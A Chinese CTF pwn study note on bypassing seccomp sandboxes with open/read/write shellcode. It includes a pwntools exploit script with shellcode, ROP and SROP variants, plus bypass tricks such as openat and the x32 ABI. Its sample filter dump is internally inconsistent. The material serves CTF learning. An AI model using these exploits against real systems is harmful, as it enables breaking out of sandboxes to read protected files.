---
title: seccomp 沙箱下的 ORW（open/read/write）与沙箱绕过
category: pwn
tags: [seccomp, orw, shellcode, syscall, 沙箱]
signals: [题目附件里有 seccomp 规则或 seccomp-tools 可用, 拿到 shell 后 cat 没权限, execve 被拒绝返回-EPERM, 题目提示 only read/write/open, 附件很小且是静态链接]
difficulty: medium
source: "CTF-Wiki C 沙盒逃逸 / man seccomp / pwntools shellcraft"
tools: [seccomp-tools, pwntools, ROPgadget, gdb]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目里有 `prctl(PR_SET_SECCOMP, ...)` 或 `seccomp()` 调用，反编译能看到 BPF 指令数组。
- 本地 `seccomp-tools dump ./pwn` 显示白名单只放行 `read/write/open/openat`。
- 拿到 shell 后执行 `cat flag` 没反应 / 返回 `Operation not permitted`。
- 附件非常小（几 KB），静态链接，`checksec` 全关或只开 NX。
- 题面明确写「禁止 execve」「only open read write」。

## 二、原理

seccomp-BPF 在内核态对 `syscall` 号做过滤，`execve` 被拒绝时返回 `-EPERM`，进程不会崩但 `execve` 失败。

典型规则（`seccomp-tools dump` 输出）：

```text
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004   A = arch
 0001: 0x15 0x00 0x05 0xc000003e   if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000   A = sys_number
 0003: 0x35 0x00 0x01 0x40000000   if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff   if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x00000000   if (A == read) goto 0007
 0006: 0x15 0x00 0x01 0x00000001   if (A == write) goto 0007
 0007: 0x06 0x00 0x00 0x7fff0000   return ALLOW
```

应对思路：

| 白名单 | 打法 |
|---|---|
| `read`/`write`/`open`/`openat` | **ORW**：自己 open flag → read 到 buf → write 到 stdout |
| 加了 `exit`/`exit_group` | 仍然 ORW |
| 只放行 `read`/`write` 且 fd 被限 | 检查是否有已打开的 flag fd，或用 `/proc/self/fd` |
| 放行 `mmap`/`mprotect` | 可以 `mprotect` 后执行 shellcode |
| 放行 `sendfile` | `sendfile(1, fd, NULL, n)` 一步输出 |
| 被禁用 `open` 但允许 `openat` | 用 `openat(AT_FDCWD, ...)` |

**ORW shellcode** 关键 syscall 号（x86-64）：
`open`=2 / `openat`=257、`read`=0、`write`=1、`exit`=60。

## 三、checksec 判读与利用思路

```text
RELRO: Partial/Full  Canary: No  NX: enabled/disabled  PIE: enabled/disabled
```

决策：

1. `NX disabled` + 栈可执行 → 直接写 ORW shellcode，`jmp rsp` 执行。
2. `NX enabled` + 静态链接 → 用 `read` 把 shellcode 读到 `.bss`，`mprotect` 或直接 `jmp` 到 bss（需 `mprotect` 可用）。
3. `NX enabled` + 只有 ROP → 手工拼 `open/read/write` 三条 syscall 链。
4. `SROP` 可用 → `sigreturn` 一次性设好寄存器，三条 syscall 用三次 frame。

确认规则先跑：`seccomp-tools dump ./pwn`，把输出直接写进笔记。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.arch = "amd64"
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

# ---------- 方案 A：手写 ORW shellcode ----------
def orw_shellcode(path=b"/flag"):
    sc = shellcraft.open(path)          # open(path, O_RDONLY)
    sc += shellcraft.read("rax", "rsp", 0x100)
    sc += shellcraft.write(1, "rsp", 0x100)
    return asm(sc)

# ---------- 方案 B：用 syscall 指令手拼（更可控，不含 \x00 陷阱） ----------
def orw_asm(path=b"./flag"):
    return asm(f"""
        xor edx, edx
        push rdx
        mov rbx, {u64(path.ljust(8, b'\\x00')):#x}
        push rbx
        mov rdi, rsp          /* path */
        xor esi, esi          /* O_RDONLY */
        xor edx, edx
        mov eax, 2            /* SYS_open */
        syscall
        mov rdi, rax          /* fd */
        mov rsi, rsp
        sub rsi, 0x200
        mov edx, 0x100
        xor eax, eax          /* SYS_read */
        syscall
        mov edx, eax
        mov edi, 1
        mov al, 1             /* SYS_write */
        syscall
        mov al, 60            /* SYS_exit */
        syscall
    """)

# ---------- 方案 C：ROP 版 ORW（NX 开 + 静态链接） ----------
def rop_orw(p, pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall_ret, bss, path=b"./flag"):
    def sc(rax, rdi, rsi, rdx):
        chain = b""
        if rax is not None: chain += p64(pop_rax) + p64(rax)
        if rdi is not None: chain += p64(pop_rdi) + p64(rdi)
        if rsi is not None: chain += p64(pop_rsi) + p64(rsi)
        if rdx is not None: chain += p64(pop_rdx) + p64(rdx)
        return chain + p64(syscall_ret)

    chain  = sc(0, 0, bss, 0x100)            # read(0, bss, 0x100) 读入 "./flag\0"
    chain += sc(2, bss, 0, 0)                # open(bss, 0, 0) -> rax = fd
    chain += sc(0, 3, bss + 0x200, 0x100)    # read(3, bss+0x200, 0x100)
    chain += sc(1, 1, bss + 0x200, 0x100)    # write(1, buf, 0x100)
    chain += p64(elf.sym.get("_exit", 0xdeadbeef))
    return chain

# ---------- 方案 D：SROP 版 ORW（gadget 不全时） ----------
def srop_orw(name=b"./flag"):
    """
    用 SigreturnFrame 把 open/read/write 串起来（每次 syscall 后 rsp 挪一个 frame）
    适合「只有 pop rax; syscall」的场景
    """
    frames = []
    f = SigreturnFrame(); f.rax = 2; f.rdi = 0x404080; f.rsi = 0; f.rdx = 0; f.rip = SYSCALL
    frames.append(f)
    f = SigreturnFrame(); f.rax = 0; f.rdi = 3; f.rsi = 0x404200; f.rdx = 0x100; f.rip = SYSCALL
    frames.append(f)
    f = SigreturnFrame(); f.rax = 1; f.rdi = 1; f.rsi = 0x404200; f.rdx = 0x100; f.rip = SYSCALL
    frames.append(f)
    return frames

if __name__ == "__main__":
    p = start()
    # 方案 A/B：把 shellcode 灌进去（栈可执行或写 bss 后 jmp）
    payload  = b"A" * 0x48                 # 占位偏移
    payload += p64(int(args.JMP or "0xdeadbeef", 16))
    p.send(payload)
    p.send(orw_shellcode(b"./flag"))
    p.interactive()
```

`sendfile` 一步输出（部分题只白名单 `sendfile`）：

```c
// sys_sendfile(out_fd, in_fd, offset, count)
sendfile(1, fd, NULL, 0x100);   // syscall 40
```

## 五、常见坑 / 变体

- **规则里禁 `open` 但放 `openat`**：`open` 号 2 被拦时换 257（`$SYS_openat`，`rdi = AT_FDCWD = -100`）。
- **`x32` ABI 绕过**：部分规则只判断 64 位 syscall 号，32 位 `int 0x80` 走不同表；老内核（<5.x）可尝试 `execve` 的 32 位号（11）。
- **fd 号猜错**：`open` 返回值是 fd，要搬到 `rdi`；ROP 里用手写的固定 fd（3）有时不对，用 `rax` 传递更稳。
- **shellcode 含 `\x00`**：`push` 立即数会引入零字节，改用 `xor/mov` 组合或先 `sub rsp` 再写入。
- **`write` 长度 0**：`read` 返回 0 时 `write` 不输出，注意 `mov edx, eax` 顺序。
- **`open` 被 `O_RDONLY` 字符串过滤**：路径可以用 `./flag`、`/flag` 两种，或写 `/proc/self/cwd/flag`。
- **`prctl` 在程序启动时设置**：如果规则里写死了 `NO_NEW_PRIVS`，无法通过 `prctl` 撤销，只能 ORW。

## 六、参考来源

- [CTF-Wiki: C 沙盒逃逸（seccomp）](https://ctf-wiki.org/pwn/sandbox/seccomp/c-sandbox-escape/)
- [man 2 seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [man 2 prctl](https://man7.org/linux/man-pages/man2/prctl.2.html)
- [pwntools shellcraft（amd64）](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)
- [HackTricks: Common Binary Protections（沙箱部分）](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [CTF-Wiki: SROP（沙箱内 SROP 链接）](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)
